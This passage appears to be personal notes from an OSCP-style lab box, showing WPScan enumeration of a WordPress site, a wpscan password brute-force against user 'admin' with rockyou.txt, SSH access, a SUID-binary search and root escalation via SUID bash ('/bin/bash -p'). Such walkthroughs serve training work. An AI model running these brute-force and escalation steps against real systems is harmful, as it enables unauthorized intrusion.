 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/

 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

  

[+] WordPress readme found: http://192.168.204.89/readme.html

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 100%

  

[+] The external WP-Cron seems to be enabled: http://192.168.204.89/wp-cron.php

 | Found By: Direct Access (Aggressive Detection)

 | Confidence: 60%

 | References:

 |  - https://www.iplocation.net/defend-wordpress-from-ddos

 |  - https://github.com/wpscanteam/wpscan/issues/1299

  

[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).

 | Found By: Rss Generator (Passive Detection)

 |  - http://192.168.204.89/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

 |  - http://192.168.204.89/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>

  

[+] WordPress theme in use: twentytwenty

 | Location: http://192.168.204.89/wp-content/themes/twentytwenty/

 | Last Updated: 2023-03-29T00:00:00.000Z

 | Readme: http://192.168.204.89/wp-content/themes/twentytwenty/readme.txt

 | [!] The version is out of date, the latest version is 2.2

 | Style URL: http://192.168.204.89/wp-content/themes/twentytwenty/style.css?ver=1.2

 | Style Name: Twenty Twenty

 | Style URI: https://wordpress.org/themes/twentytwenty/

 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...

 | Author: the WordPress team

 | Author URI: https://wordpress.org/

 |

 | Found By: Css Style In Homepage (Passive Detection)

 |

 | Version: 1.2 (80% confidence)

 | Found By: Style (Passive Detection)

 |  - http://192.168.204.89/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

  

[+] Enumerating Vulnerable Plugins (via Passive Methods)

  

[i] No plugins Found.

  

[+] Enumerating Vulnerable Themes (via Passive and Aggressive Methods)

 Checking Known Locations - Time: 00:00:05 <=============> (503 / 503) 100.00% Time: 00:00:05

[+] Checking Theme Versions (via Passive and Aggressive Methods)

  

[i] No themes Found.

  

[+] Enumerating Timthumbs (via Passive and Aggressive Methods)

 Checking Known Locations - Time: 00:00:35 <===========> (2575 / 2575) 100.00% Time: 00:00:35

  

[i] No Timthumbs Found.

  

[+] Enumerating Config Backups (via Passive and Aggressive Methods)

 Checking Config Backups - Time: 00:00:01 <==============> (137 / 137) 100.00% Time: 00:00:01

  

[i] No Config Backups Found.

  

[+] Enumerating DB Exports (via Passive and Aggressive Methods)

 Checking DB Exports - Time: 00:00:01 <====================> (71 / 71) 100.00% Time: 00:00:01

  

[i] No DB Exports Found.

  

[+] Enumerating Medias (via Passive and Aggressive Methods) (Permalink setting must be set to "Plain" for those to be detected)

 Brute Forcing Attachment IDs - Time: 00:00:07 <=========> (100 / 100) 100.00% Time: 00:00:07

  

[i] No Medias Found.

  

[+] Enumerating Users (via Passive and Aggressive Methods)

 Brute Forcing Author IDs - Time: 00:00:01 <===============> (10 / 10) 100.00% Time: 00:00:01

  

[i] User(s) Identified:

  

[+] admin

 | Found By: Author Posts - Author Pattern (Passive Detection)

 | Confirmed By:

 |  Rss Generator (Passive Detection)

 |  Wp Json Api (Aggressive Detection)

 |   - http://192.168.204.89/index.php/wp-json/wp/v2/users/?per_page=100&page=1

 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

 |  Login Error Messages (Aggressive Detection)

  

[!] No WPScan API Token given, as a result vulnerability data has not been output.

[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

  

[+] Finished: Wed Jun 21 15:41:15 2023

[+] Requests Done: 3409

[+] Cached Requests: 41

[+] Data Sent: 956.19 KB

[+] Data Received: 531.376 KB

[+] Memory used: 277.641 MB

[+] Elapsed time: 00:00:58

  

Found user admin

  

Will attempt a wpscan bruteforce

  

#Weaponization 

Added to local id_rsa file

  

#Exploit

  

##Wordpress bruteforce

  

wpscan --url http://192.168.204.89 -U admin -P /usr/share/wordlists/rockyou.txt

.

.

.

[+] Performing password attack on Wp Login against 1 user/s

[i] No Valid Passwords Found.

  

##sqlmap (Not OSCP Kosher but worth a look)

output too long

Nothing

  

##SSH

 →  ssh oscp@192.168.204.89                                                                                15:58:44

Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

  

 * Documentation:  https://help.ubuntu.com

 * Management:     https://landscape.canonical.com

 * Support:        https://ubuntu.com/advantage

  

  System information as of Wed 21 Jun 2023 03:58:56 PM UTC

  

  System load:  1.2                Processes:             214

  Usage of /:   25.4% of 19.56GB   Users logged in:       0

  Memory usage: 67%                IPv4 address for eth0: 192.168.204.89

  Swap usage:   0%

  

  

0 updates can be installed immediately.

0 of these updates are security updates.

  

  

The list of available updates is more than a week old.

To check for new updates run: sudo apt update

  

  

The programs included with the Ubuntu system are free software;

the exact distribution terms for each program are described in the

individual files in /usr/share/doc/*/copyright.

  

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by

applicable law.

  

-bash-5.0$ whoami

oscp

-bash-5.0$ ls

ip  local.txt

-bash-5.0$ cat ip 

#!/bin/sh

cp /etc/issue-standard /etc/issue

/usr/local/bin/get-ip-address >> /etc/issue

-bash-5.0$ cat local.txt 

e0aeb84eff29ca9fd5bd651cac244aba

-bash-5.0$ ls -alt

total 36

drwxr-xr-x 4 oscp oscp 4096 Jun 21 15:58 .

drwx------ 2 oscp oscp 4096 Jun 21 15:58 .cache

-rw-r--r-- 1 oscp oscp   33 Jun 21 15:26 local.txt

-rw------- 1 oscp oscp    0 Aug 28  2020 .bash_history

-rwxr-xr-x 1 root root   88 Jul  9  2020 ip

drwxrwxr-x 2 oscp oscp 4096 Jul  9  2020 .ssh

-rw-r--r-- 1 oscp oscp    0 Jul  9  2020 .sudo_as_admin_successful

drwxr-xr-x 3 root root 4096 Jul  9  2020 ..

-rw-r--r-- 1 oscp oscp  220 Feb 25  2020 .bash_logout

-rw-r--r-- 1 oscp oscp 3771 Feb 25  2020 .bashrc

-rw-r--r-- 1 oscp oscp  807 Feb 25  2020 .profile

  

  

-bash-5.0$ cat ip

#!/bin/sh

cp /etc/issue-standard /etc/issue

/usr/local/bin/get-ip-address >> /etc/issue

Basic debugging script

  

#privilege Escalation

Now on the host I can either run everything manually or look for n automated method. I'll run linpeas

  

##Check bins for root tier privlerdges 

bash-5.0# find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null

-rwsr-xr-x 1 root root 110792 Jul 29  2020 /snap/snapd/8790/usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 110792 Jun  5  2020 /snap/snapd/8140/usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1885/bin/mount

-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1885/bin/ping

-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1885/bin/su

-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1885/bin/umount

-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn

-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh

-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd

-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp

-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd

-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo

-rwsr-xr-- 1 root systemd-resolve 42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign

-rwsr-xr-x 1 root root 43088 Mar  5  2020 /snap/core18/1754/bin/mount

-rwsr-xr-x 1 root root 64424 Jun 28  2019 /snap/core18/1754/bin/ping

-rwsr-xr-x 1 root root 44664 Mar 22  2019 /snap/core18/1754/bin/su

-rwsr-xr-x 1 root root 26696 Mar  5  2020 /snap/core18/1754/bin/umount

-rwsr-xr-x 1 root root 76496 Mar 22  2019 /snap/core18/1754/usr/bin/chfn

-rwsr-xr-x 1 root root 44528 Mar 22  2019 /snap/core18/1754/usr/bin/chsh

-rwsr-xr-x 1 root root 75824 Mar 22  2019 /snap/core18/1754/usr/bin/gpasswd

-rwsr-xr-x 1 root root 40344 Mar 22  2019 /snap/core18/1754/usr/bin/newgrp

-rwsr-xr-x 1 root root 59640 Mar 22  2019 /snap/core18/1754/usr/bin/passwd

-rwsr-xr-x 1 root root 149080 Jan 31  2020 /snap/core18/1754/usr/bin/sudo

-rwsr-xr-- 1 root systemd-resolve 42992 Jun 10  2019 /snap/core18/1754/usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 436552 Mar  4  2019 /snap/core18/1754/usr/lib/openssh/ssh-keysign

-rwsr-xr-- 1 root messagebus 51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

-rwsr-xr-x 1 root root 130152 Jun  5  2020 /usr/lib/snapd/snap-confine

-rwsr-xr-x 1 root root 14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device

-rwsr-xr-x 1 root root 22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1

-rwsr-xr-x 1 root root 473576 May 29  2020 /usr/lib/openssh/ssh-keysign

-rwsr-xr-x 1 root root 88464 May 28  2020 /usr/bin/gpasswd

-rwsr-xr-x 1 root root 55528 Apr  2  2020 /usr/bin/mount

-rwsr-xr-x 1 root root 39144 Mar  7  2020 /usr/bin/fusermount

-rwsr-xr-x 1 root root 68208 May 28  2020 /usr/bin/passwd

-rwsr-xr-x 1 root root 44784 May 28  2020 /usr/bin/newgrp

-rwsr-sr-x 1 daemon daemon 55560 Nov 12  2018 /usr/bin/at

-rwsr-xr-x 1 root root 166056 Feb  3  2020 /usr/bin/sudo

-rwsr-xr-x 1 root root 85064 May 28  2020 /usr/bin/chfn

-rwsr-sr-x 1 root root 1183448 Feb 25  2020 /usr/bin/bash

-rwsr-xr-x 1 root root 31032 Aug 16  2019 /usr/bin/pkexec

-rwsr-xr-x 1 root root 39144 Apr  2  2020 /usr/bin/umount

-rwsr-xr-x 1 root root 53040 May 28  2020 /usr/bin/chsh

-rwsr-xr-x 1 root root 67816 Apr  2  2020 /usr/bin/su

[https://gtfobins.github.io/gtfobins/bash/#suid](https://gtfobins.github.io/gtfobins/bash/#suid)

  

-bash-5.0$ /bin/bash -p

bash-5.0# whoami

root

bash-5.0# cd /root

bash-5.0# ls

fix-wordpress  flag.txt  proof.txt  snap

bash-5.0# cat proof.txt 

fb49956448432e09aa409127465a0fb4

  

Boot2Root